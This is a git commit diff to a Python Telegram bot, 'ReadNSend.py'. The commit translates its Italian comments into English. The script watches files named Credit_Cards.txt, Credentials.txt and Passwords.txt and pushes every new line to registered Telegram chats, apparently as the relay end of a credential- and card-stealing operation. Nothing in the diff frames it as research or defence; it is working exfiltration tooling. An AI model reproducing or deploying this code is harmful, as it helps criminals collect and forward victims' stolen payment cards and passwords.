a5b7ec01bf04697b5f1cb9737069c495c35c2685
Pape20146 <72491360+Pape20146@users.noreply.github.com>
2023-11-22 09:54:35 +0100

    Update ReadNSend.py

--- Server/ReadNSend.py
+++ Server/ReadNSend.py
@@ -3,12 +3,11 @@ import telebot
 import time
 import threading
 
-#--------Variable declaration and object initialization--------#
-
+#Variable declaration and object initialization
 API_KEY = "YOUR_KEY"
 bot = telebot.TeleBot(API_KEY)
 
-# Lista dei percorsi dei file
+# List of file paths
 file_paths = [
     os.path.join(os.path.dirname(os.path.abspath(__file__)), "Credit_Cards.txt"),
     os.path.join(os.path.dirname(os.path.abspath(__file__)), "Credentials.txt"),
@@ -17,31 +16,31 @@ file_paths = [
     os.path.join(os.path.dirname(os.path.abspath(__file__)), "Passwords.txt"),
 ]
 
-# Dizionario per tenere traccia delle informazioni per ogni file
+# Dictionary to keep track of information for each file
 file_info = {file_path: {'modification_time': os.path.getmtime(file_path), 'sent_lines': set()} for file_path in file_paths}
 
-# Lista delle chat ID
+# List of chat IDs
 chat_ids = set()
 
-# Comando per iniziare e registrare il chat ID
+# Command to start and register the chat ID
 @bot.message_handler(commands=['start'])
 def start(message):
     global chat_ids
     chat_id = message.chat.id
-    chat_ids.add(chat_id)  # Aggiungi il chat ID alla lista
+    chat_ids.add(chat_id)  # Add the chat ID to the list
     bot.send_message(chat_id, "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣁⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠛⠉⠛⠶⠀⠀⢐⠿⠋⠀⢨⣿⣿⣿⣿⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢷⣿⣿⣶⠀⠀⠉⢶⣿⣿⠿⢿⣿⣿⣿⡄⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣶⡶⠂⠀⣀⠀⢀⡄⠐⢲⡾⣻⣿⣿⣿⠇⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣯⢿⡶⣶⣿⣟⣿⡶⠶⣿⢣⣿⣿⣿⣿⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣧⠛⠒⠠⣤⣤⠶⠾⢣⣿⣿⣿⣿⣿⣤⣀⠀⠀⠀\n⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⢿⣿⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n\nWelcome! You will now receive updates from the files")
 
-# Funzione principale per controllare i cambiamenti nei file
+# Main function to check changes in files
 def check_file_changes():
     global file_info
 
     while True:
         try:
             for file_path in file_paths:
-                # Ottieni il tempo corrente di modifica del file
+                # Get the current file modification time
                 current_modification_time = os.path.getmtime(file_path)
 
-                # Verifica se il file è stato modificato
+                # Check if the file has been modified
                 if current_modification_time != file_info[file_path]['modification_time']:
                     with open(file_path, 'r') as file:
                         for line in file:
@@ -73,7 +72,7 @@ def check_file_changes():
                                     
                                 file_info[file_path]['sent_lines'].add(stripped_line)
 
-                    # Aggiorna le informazioni del file nel dizionario
+                    # Update file information in the dictionary
                     file_info[file_path]['modification_time'] = current_modification_time
 
         except Exception as e:
@@ -81,7 +80,7 @@ def check_file_changes():
 
         time.sleep(5)
 
-# Start the file change monitoring thread and the bot pooling loop
+# Start the file change monitoring thread and the bot polling loop
 file_change_thread = threading.Thread(target=check_file_changes)
 file_change_thread.start()
 
